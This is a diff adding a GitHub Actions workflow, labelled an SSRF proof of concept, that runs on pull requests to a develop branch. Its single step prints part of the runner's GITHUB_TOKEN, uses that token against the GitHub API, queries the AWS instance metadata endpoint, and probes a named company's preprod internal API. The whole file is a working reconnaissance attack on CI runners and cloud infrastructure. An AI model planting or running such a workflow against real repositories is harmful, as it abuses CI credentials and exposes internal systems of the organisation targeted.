@@ -1,0 +1,18 @@
+name: GitHub Actions SSRF PoC
+on: 
+  pull_request:
+    branches: [develop]
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+    - name: SSRF Impact
+      run: |
+        echo "=== RUNNER IMPACT ==="
+        echo "GITHUB_TOKEN active: $GITHUB_TOKEN" | cut -c1-20
+        curl -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/user
+        echo "=== AWS METADATA ==="
+        curl -s http://169.254.169.254/latest/meta-data/ || echo "No AWS metadata"
+        echo "=== INTERNAL ACCESS ==="
+        curl -k -I https://bb-preprod-api.playtika.com/health || echo "Internal endpoints"
